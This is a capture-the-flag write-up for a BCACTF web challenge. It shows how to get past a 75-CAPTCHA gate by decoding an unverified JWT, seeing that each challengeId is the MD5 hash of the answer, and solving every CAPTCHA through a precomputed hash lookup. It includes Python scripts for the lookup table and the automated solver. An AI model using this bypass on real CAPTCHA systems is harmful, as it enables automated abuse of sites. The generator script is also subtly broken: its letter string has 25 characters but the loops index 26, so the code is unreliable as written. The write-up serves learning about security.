## Solve Process
We are greeted with this webpage  
![image66](/static/writeups/photos/image66.png)

In order to access the webpage, we have to solve a series of simple CAPTCHA Challenges  
![image67](/static/writeups/photos/image67.png)	  
After solving the challenge, we are redirected to the home page, followed by a token, as such. We’ll take a look at this token later  
*`http://challs.bcactf.com:30311/?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjYXB0Y2hhSWQiOiIwYWYwNDhjZi05NGNmLTRhMDMtODc2MC0yYTRlOGVlMGU2YjgiLCJyb3V0ZUlkIjoiLyIsImNoYWxsZW5nZUlkIjpudWxsLCJzb2x2ZWQiOjIsInRvdGFsIjoyLCJkb25lIjp0cnVlLCJpYXQiOjE3MTgxMTU3MTYsImV4cCI6MTcxODExNTc3Nn0.VgzTchAeRcD7quDK6SdWmu7eK9annXV9SLWzwT9s4KE`* 
![image68](/static/writeups/photos/image68.png)

To access the Flag Page though, we need to solve 75 Captchas, within the span of 1 minute. Manual solving is out of the question.

We need a way to quickly solve the captchas, at a rate of 0.8s per Captcha minimum.   
Creating an actual image recognition bot to solve the captchas would likely be too slow, judging from [this](https://ctftime.org/writeup/32523) CTF challenge, which it’s bot solves at a rate of 4.5s per captcha.

Let's take a look at the request sent each time we complete a captcha.  
![image69](/static/writeups/photos/image69.png)

There's the captchaToken again. The captchaToken seems to be a JWT token. You can use an online [JWT token decoder](https://jwt.io) to decode this. 
```json
{
  "captchaId": "fd4143a9-cede-4c95-89bf-18b1a3c49847",
  "routeId": "/flag",
  "challengeId": "aa8111d70493638e58f13c61bc8aeb3e",
  "solved": 0,
  "total": 75,
  "done": false,
  "iat": 1718121380,
  "exp": 1718121440
}
```
From here, we can see that the token keeps track of wheter the challenge is completed or not. This probably means that the token we saw in the url parameter’s likely correspond to this token, when done is set to true.

I tried to edit the token using tricks from [this website](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens) but to no avail, so I assumed the JWT token is being checked properly.   
Instead, Let's take a look at the challengeId. As mentioned in the hint, the challengeId for "SCLN" would be 1e8298221a767bb37c01eb0cc61d1775. We can assume “SCLN” refers to the captcha’s answer.  
This implies each captcha word answer is linked to its corresponding challengeId.

Notice that the challengeId is 32 characters long, and is a hex string. This means that it could be a form of [**hashing**](https://en.wikipedia.org/wiki/Cryptographic\_hash\_function\#Cryptographic\_hash\_algorithms). Out of all the common ones (SHA, MD5), MD5 produces a 32 character long string, so lets see if we can get the correct challengeId by hashing “SCLN”.  
Using [CyberChef](https://gchq.github.io/CyberChef/\#recipe=MD5()\&input=U0NMTg)  
![image71](/static/writeups/photos/image71.png)  
It works\!

I did a sanity check on an actual challengeId from the captcha, and it seems to work the same.

With this information, we need a way to “reverse” the hash. Since the captcha’s answer is only 4 characters long, we can use a **rainbow table**. We just need to generate every possible 4 character MD5 hash, and map each MD5 hash back to its corresponding word.   
Here's the script to generate the MD5 hashes
```python
import hashlib

letters = "ABCDEFGHJKLMNOPQRSTUVWXYZ"

# generate all possible 4 letter combinations, and their md5 hashes
def generate_combinations():
    combinations = {}
    for i in range(26):
        for j in range(26):
            for k in range(26):
                for l in range(26):
                    combination = letters[i] + letters[j] + letters[k] + letters[l]
                    combinations[combination] = hashlib.md5(combination.encode()).hexdigest()
    return combinations

with open("hashes.txt", "w") as f:
    for combination, hash in generate_combinations().items():
        f.write(f"{combination} {hash}\n")
```

Afterwards, we just need to make a request to the server to get the captcha token, decode it to find the challengeId, and see what word that challengeId matches to, and send that word back to the server. Repeat this process 75 times, until you solve all the captcha and get the completed captchaToken   
Here’s the code which does that:  
```python
import requests
import jwt

headers = {
    "Referer": "http://challs.bcactf.com:30477/captcha?destination=/flag",
    "Origin": "http://challs.bcactf.com:30477"
}

# Create the rainbow table
hashmap = {}
with open("hashes.txt", "r") as f:
    hashes = f.readlines()
    for line in hashes:
        combination, hash = line.split()
        hashmap[hash] = combination

url = "http://challs.bcactf.com:30477/captcha"
# Initialise the Captcha
response = requests.post(url, json = {"routeId":"/flag"}, headers = headers)

for i in range(75):
    # For each captcha, decode the captcha token, get the challengeId, and get the corresponding word.
    captchaToken = jwt.decode(response.json()["captchaToken"], options = {"verify_signature": False})
    challengeId = captchaToken["challengeId"]
    result = hashmap[challengeId]

    response = requests.post(url, json = {"captchaToken": response.json()["captchaToken"], "word": result}, headers=headers)

captchaToken = response.json()["captchaToken"]
print(captchaToken)
```
After getting a valid captchaToken, we can visit *`http://challs.bcactf.com:30311/flag?token=<token\>`*
to get our flag (You need to be fast\! The token expires within 60 seconds)  
![image74](/static/writeups/photos/image74.png)
